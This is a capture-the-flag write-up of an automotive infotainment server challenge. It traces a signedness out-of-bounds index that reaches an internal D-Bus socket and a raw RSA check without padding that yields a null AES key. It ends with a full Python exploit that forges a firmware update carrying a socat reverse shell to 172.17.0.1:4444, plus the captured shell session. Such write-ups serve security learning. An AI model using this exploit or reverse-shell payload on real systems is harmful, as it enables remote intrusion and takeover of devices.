# FCSC 2026: pwn - Autodiag - medium: 
## This debug port looks promising

### - This challenge provides us with a few interesting files:

#### 1. ivi_server.c
#### 2. proto.h
#### 3. ivi_dbusd.cpp
#### 4. ivi_update_runner.cpp
#### 5. update.bin

right off the bat we conclude that we need to gain
RCE on the ivi_server which is stands for In Vehicle Infotainment server, so we are dealing with an automotive challenge

### - Functionality

it looks like this server accepts packets with the following header: 
*(proto.h)* *(32 bits for every field)*
```
struct MsgHdr {
    uint32_t magic; 
    uint32_t version;
    uint32_t op;
    uint32_t body_len;
    uint32_t req_id;
};
```
- the magic header is hardcoded as 'IVI0' = 0x30495649
- version is hardcoded as 1
- op is an opcode for certain commands we can send
- body_len should always match the size of the body section
- we dont really care about the req_id

opcode numbers:

*proto.h*
```
enum IviOp {
    OP_HELLO = 1,
    OP_CONN = 2,
    OP_RESP = 3,
    OP_CLOSE = 4,
    OP_HEALTHCHECK = 5,
    OP_LISTCONN = 6,
    OP_GETCFG = 7,
    OP_SETCFG = 8,
    OP_GETTIME = 9,
    OP_GETSTATS = 10,
    OP_LOGLEVEL = 11,
    OP_ECHO = 12,
    OP_RESOLVE = 13,
    OP_VERSIONINFO = 14
};
```

*ivi_server.c*
```
static int dispatch_request(struct ServerState *st, int client_fd,
                            const struct MsgHdr *hdr, const uint8_t *body) {
    switch (hdr->op) {
        case OP_HELLO:
            return op_hello(st, client_fd, hdr, body); //safe
        case OP_CONN:
            return op_conn(st, client_fd, hdr, body); //safe
        case OP_RESP:
            return op_resp(st, client_fd, hdr, body); //sus oob write
        case OP_CLOSE:
            return op_close(st, client_fd, hdr, body); //safe
        case OP_HEALTHCHECK:
            return op_healthcheck(st, client_fd, hdr, body); //safe
        case OP_LISTCONN:
            return op_listconn(st, client_fd, hdr, body); //safe
        case OP_GETCFG:
            return op_getcfg(st, client_fd, hdr, body); //safe
        case OP_SETCFG:
            return op_setcfg(st, client_fd, hdr, body); 
        case OP_GETTIME:
            return op_gettime(client_fd, hdr, body); 
        case OP_GETSTATS:
            return op_getstats(st, client_fd, hdr, body);
        case OP_LOGLEVEL:
            return op_loglevel(st, client_fd, hdr, body);
        case OP_ECHO:
            return op_echo(client_fd, hdr, body);
        case OP_RESOLVE:
            return op_resolve(client_fd, hdr, body);
        case OP_VERSIONINFO:
            return op_versioninfo(client_fd, hdr, body);
        default:
            return send_response(client_fd, hdr->op, hdr->req_id, ST_INVALID, NULL, 0);
    }
}
```

and body: *(this was manually constructed from code auditing)*
```
conn_id (64 bit)
payload_len (64 bit)
payload (64 bit)
```

the body section caught my interest the most as the payload variable was user controlled with almost no restrictions

In the main function of the program i found this: `conn = dbus_connection_open_private(DBUS_ADDR, &err);`
which basically makes a private connection to not be accessed by us at `DBUS_ADDR` which is hardcoded as `unix:path=/run/ivi/bus.sock`.
bus.sock is the internal bus socket of the car's firmware we are looking at

### - Main vulnerability: *ivi_server.c*
```
struct ServerState {
    int conn_fds[MAX_CONN_SLOTS]; // MAX_CONN_SLOTS = 10 (0 - 9)
    int dbus_sock_fd;

    uint64_t conn_tx_msgs[MAX_CONN_SLOTS];
    uint64_t conn_tx_bytes[MAX_CONN_SLOTS];

    DBusConnection *dbus_conn;

    uint64_t rx_msgs;
    uint64_t tx_msgs;
    uint64_t errors;

    uint32_t log_level;
    uint64_t last_ping_ms;

    struct ConfigEntry cfgs[4];
};
```
in the op_resp function which is accessed through opcode 3 there is an out of bounds vulnerability where we can wrap around the ServerState struct and access the arbitrary fd of `dbus_sock_fd` (the private connection mentioned previously):
```
static int op_resp(struct ServerState *st, int client_fd, const struct MsgHdr *hdr,
                   const uint8_t *body) {
    size_t off = 0;
    size_t conn_id = 0;
    size_t payload_len = 0;
    size_t max_len = 0;
    const uint8_t *payload = NULL;
    int target_fd;
    uint8_t frame[MAX_RESP_FRAME];
    uint32_t sent;
    int64_t idx;

    if (parse_u64(body, hdr->body_len, &off, &conn_id) != 0 ||
        parse_u64(body, hdr->body_len, &off, &payload_len) != 0) {
        return send_response(client_fd, hdr->op, hdr->req_id, ST_INVALID, NULL, 0);
    }

    if (conn_id > SIZE_MAX || payload_len > SIZE_MAX) {
        return send_response(client_fd, hdr->op, hdr->req_id, ST_INVALID, NULL, 0);
    }

    max_len = (size_t)hdr->body_len - off;
    if (max_len > sizeof(frame)) {
        return send_response(client_fd, hdr->op, hdr->req_id, ST_INVALID, NULL, 0);
    }

    idx = (int64_t)conn_id;
    if (idx > MAX_CONN_SLOTS - 1) {
        return send_response(client_fd, hdr->op, hdr->req_id, ST_INVALID, NULL, 0);
    }
    
    target_fd = st->conn_fds[idx];

    [.....]
}
```

here, conn_id is user controlled through the body of the packet:
```parse_u64(body, hdr->body_len, &off, &conn_id)``` basically, the first 8 bytes of our body section of the packet are parsed as the conn_id *(as uint64_t which is safe but later it is used as a signed int int64_t which is a signess bug `idx = (int64_t)conn_id;`)* which are more than enough to cause a wrap-around of the `idx` variable which in turn causes the `target_fd` (`= st->conn_fds[idx]`) to pass the upper bounds check *(there is no lower bounds check)* which let us connect to the arbitrary `dbus_sock_fd` fd which lets us talk to the internal bus of the car as a privileged user. However this is not the whole exploit as we have not gained complete control of the car

After making a valid packet and debugging we come to the conclusion that setting the `conn_id` as `0x800000000000000A`, this number is after multiplied by 4 because it is an integer and becomes `0x2000000000000028`, the 2 at the start is truncated as we are dealing with a 64 bit number so we remain with `0x28` which is 40 in decimal,  so we effectively land on conn_fds[10] (out of bounds) which causes the `target_fd` to land exactly on `dbus_sock_fd`

after i found this, I started looking around into other source code provided but ultimately ran into *ivi_dbusd.cpp* which allows us to do do a 'RunUpdate' action
```
    if (dbus_message_is_method_call(msg, IVI_DBUS_IFACE, "RunUpdate")) {
        const char *payload = nullptr;
        DBusError err;

        dbus_error_init(&err);
        if (!dbus_message_get_args(msg, &err, DBUS_TYPE_STRING, &payload,
                                   DBUS_TYPE_INVALID)) {
            dbus_error_free(&err);
            return send_error(conn, msg, DBUS_ERROR_INVALID_ARGS, "invalid arguments");
        }

        std::string update = payload ? payload : "";
        return send_string(conn, msg, run_update(update));
    }
```
this run_update function looks very interesting:
```
static std::string run_update(const std::string &b64_update) {
    if (b64_update.empty() || b64_update.size() > (256 * 1024)) {
        return "update-invalid-size";
    }

    int pipefd[2];
    if (pipe(pipefd) != 0) {
        return "update-runner-error";
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return "update-runner-error";
    }

    if (pid == 0) {
        char *const argv[] = {const_cast<char *>("/opt/ivi/bin/ivi_update_runner"),
                              const_cast<char *>(b64_update.c_str()), nullptr};
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);
        execv(argv[0], argv);
        _exit(127);
    }

    close(pipefd[1]);
    std::string output;
    char buf[256];
    while (true) {
        ssize_t n = read(pipefd[0], buf, sizeof(buf));
        if (n <= 0) {
            break;
        }
        output.append(buf, buf + n);
        if (output.size() > (64 * 1024)) {
            break;
        }
    }
    close(pipefd[0]);

    int status = 0;
    waitpid(pid, &status, 0);

    std::string result;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        result = output.empty() ? "update-ok" : output;
    } else {
        result = output.empty() ? "update-failed" : output;
    }

    return result;
}
```
It expects user controlled update guidance encoded in base64 and
executes it as `argv[1]` to `/opt/ivi/bin/ivi_update_runner`

*ivi_update_runner.cpp*
```
static std::vector<uint8_t> decode_update_payload(const std::string &b64_update) {
    auto buf = base64_decode(b64_update);
    if (buf.size() < 0x20 + SIG_BYTES + KEY_BLOB_BYTES) {
        throw std::runtime_error("update too small");
    }
    if (memcmp(buf.data(), "UPD0", 4) != 0) {
        throw std::runtime_error("bad magic");
    }

    uint32_t h_size = read_u32_le(buf.data() + 8);
    if (h_size > 0x400 || h_size < 0x20) {
        throw std::runtime_error("bad header size");
    }

    size_t off_sig = (size_t)h_size;
    size_t off_key = off_sig + SIG_BYTES;
    size_t off_ct = off_key + KEY_BLOB_BYTES;
    if (buf.size() < off_ct) {
        throw std::runtime_error("truncated update");
    }

    FILE *f = fopen(kPublicKeyPath, "rb");
    if (!f) {
        throw std::runtime_error("open pubkey failed");
    }
    EVP_PKEY *pkey = PEM_read_PUBKEY(f, nullptr, nullptr, nullptr);
    fclose(f);
    if (!pkey) {
        throw std::runtime_error("PEM_read_PUBKEY failed");
    }

    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
    EVP_PKEY_free(pkey);
    if (!rsa) {
        throw std::runtime_error("EVP_PKEY_get1_RSA failed");
    }

    auto hdr_hash = sha256(buf.data(), (size_t)h_size);
    auto sig_plain = rsa_public_raw_256(rsa, buf.data() + off_sig);
    if (memcmp(sig_plain.data(), hdr_hash.data(), 32) != 0) {
        RSA_free(rsa);
        throw std::runtime_error("signature check failed");
    }

    auto key_plain = rsa_public_raw_256(rsa, buf.data() + off_key);
    uint8_t aes_key[AES_KEY_BYTES];
    memcpy(aes_key, key_plain.data(), AES_KEY_BYTES);

    std::vector<uint8_t> ct(buf.begin() + (long)off_ct, buf.end());
    auto pt = aes256_cbc_decrypt_zero_iv(ct, aes_key);
    pt = pkcs7_unpad(std::move(pt));

    RSA_free(rsa);
    return gunzip_all(pt);
}

int main(int argc, char **argv) {
 
    [.....]

    try {
        auto payload = decode_update_payload(argv[1]);
        return exec_payload_memfd(payload);
    } catch (const std::exception &e) {
        fprintf(stderr, "update failed: %s\n", e.what());
        return 1;
    }
}
```

after looking through *ivi_update_runner.cpp* further we constructed an update file format *(update.bin)*:
```
[0] UPD0: magic
[4] h_size: 32 bits len of the signature
[8] header: data
[h_size] signature: SHA256 of the header value encrypted using RSA
[h_size+256] key: AES key encrypted using RSA
[h_size+512] payload: AES encrypted zlib archive of the update payload
```

also another interesting (vulnerable) function:
```
static std::vector<uint8_t> rsa_public_raw_256(RSA *rsa, const uint8_t *sig256) {
    std::vector<uint8_t> out(RSA_BYTES);

    const BIGNUM *n = nullptr;
    const BIGNUM *e = nullptr;
    RSA_get0_key(rsa, &n, &e, nullptr);

    BIGNUM *S = BN_bin2bn(sig256, (int)RSA_BYTES, nullptr);
    if (!S) {
        throw std::runtime_error("BN_bin2bn failed");
    }

    BN_CTX *ctx = BN_CTX_new();
    if (!ctx) {
        BN_free(S);
        throw std::runtime_error("BN_CTX_new failed");
    }

    BIGNUM *M = BN_new();
    if (!M) {
        BN_free(S);
        BN_CTX_free(ctx);
        throw std::runtime_error("BN_new failed");
    }

    if (BN_mod_exp(M, S, e, n, ctx) != 1) {
        BN_free(M);
        BN_free(S);
        BN_CTX_free(ctx);
        throw std::runtime_error("BN_mod_exp failed");
    }

    int mlen = BN_num_bytes(M);
    std::vector<uint8_t> tmp((size_t)mlen);
    BN_bn2bin(M, tmp.data());
    if ((size_t)mlen > RSA_BYTES) {
        BN_free(M);
        BN_free(S);
        BN_CTX_free(ctx);
        throw std::runtime_error("rsa output too large");
    }

    memset(out.data(), 0, RSA_BYTES);
    memcpy(out.data() + (RSA_BYTES - (size_t)mlen), tmp.data(), (size_t)mlen);

    BN_free(M);
    BN_free(S);
    BN_CTX_free(ctx);
    return out;
}
```
raw RSA is implemented without padding here, which is a fatal mistake as it is vulnerable to the basic math fact: 
 $$0^a = 0$$
$$M \equiv S^e \pmod n$$
we control S here, so we send a ciphertext block of 0s and this is the result
$$M \equiv 0^e \pmod n$$  
which equals 0.
the server converts that 0 back into a byte array to use as the symmetric AES key for the rest of the file *(update.bin)*. `S = 0` translates to an AES key of `\x00 * 256`

So in conclusion, we have to send a packet with the correct fields which contains the malicious conn_id (oob) and a malicious update payload which spawns a reverse shell back to us. Using a ciphertext block of full `\x00` nullifies all encryption and using the jeepney library we construct a serialized RunUpdate method call using our malicious update payload encoded in base64 which in return gives us a reverse shell

```
from pwn import *
from jeepney import *
from base64 import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from zlib import *

context.log_level = 'debug'

io = remote('localhost', 4000)

version = 1
opcode = 3

req_id = 0
magic = 0x30495649

# conn_id to trigger OOB    
conn_id = 0x800000000000000A 

revshell = b"#!/bin/sh\nsocat TCP:172.17.0.1:4444 EXEC:'/bin/bash -p'" 

# read the update header
f = open('./src/helper/update.bin', 'rb')
update_header = f.read(512) 

# encrypt and pad the compressed revshell with AES-256-CBC using a null key and null IV
key = AES.new(b'\x00' * 32, AES.MODE_CBC, iv = b'\x00' * 16) 
enc_revshell = key.encrypt(pad(compress(revshell, wbits = 16 + MAX_WBITS), 16, style = 'pkcs7'))

# build the update payload
update = update_header
update += b'\x00' * 256  
update += enc_revshell

updateb64 = b64encode(update).decode()

# build the RunUpdate method call
dbus = DBusAddress(
    '/com/acme/ivi/ServiceManager',
    bus_name = 'com.acme.ivi.ServiceManager',
    interface = 'com.acme.ivi.ServiceManager'
)

RunUpdate = new_method_call(dbus, 'RunUpdate', 's', (updateb64,))
RunUpdate.header.serial = 1
payload = RunUpdate.serialise()

# build the final packet
body = p64(conn_id)
body += p64(len(payload))
body += payload

body_len = len(body)

msghdr = p32(magic)
msghdr += p32(version) 
msghdr += p32(opcode) 
msghdr += p32(body_len) 
msghdr += p32(req_id)

packet = msghdr + body

io.send(packet)
io.interactive()
```
All the following functions are used to to make a valid update that decrypts gracefully  based on *ivi_update_runner.cpp* operations on our update payload (we basically build a counterfeit *update.bin*)

- `compress(..., wbits=16+MAX_WBITS)` is gzip format specifically, because the runner calls `inflateInit2(&zs, 16+MAX_WBITS)` which expects gzip not zlib
- `pad(..., 16, style='pkcs7')` AES-CBC requires the input to be an exact multiple of 16 bytes, `pkcs7` fills the remainder
- `cipher.encrypt(...)` encrypts the padded compressed payload
- `update = update_header` UPD0 header + valid RSA signature from update.bin
- `update += b'\x00' * 256` fake RSA-encrypted AES key (S = 0)
- `update += enc_revshell ` add our encrypted reverse shell payload

```
achilla@debian:~$  nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.18.0.2] 34464
ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
printflag
proc
root
run
sbin
srv
sys
tmp
usr
var
./printflag
```







